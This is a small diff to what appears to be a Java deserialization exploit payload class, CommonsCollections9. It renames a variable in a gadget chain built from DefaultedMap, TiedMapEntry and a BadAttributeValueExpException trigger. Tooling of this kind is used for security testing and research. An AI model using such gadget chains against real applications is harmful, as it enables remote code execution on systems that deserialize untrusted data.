@@ -50,9 +50,9 @@ public class CommonsCollections9 implements ObjectPayload<Object> {
         Map defaultedmap = DefaultedMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(defaultedmap, s);
 
-        Object val = KickOff.badAttributeValueExpException(entry);
+        Object badAttributeValueExpException = KickOff.badAttributeValueExpException(entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
-        return val;
+        return badAttributeValueExpException;
     }
 }
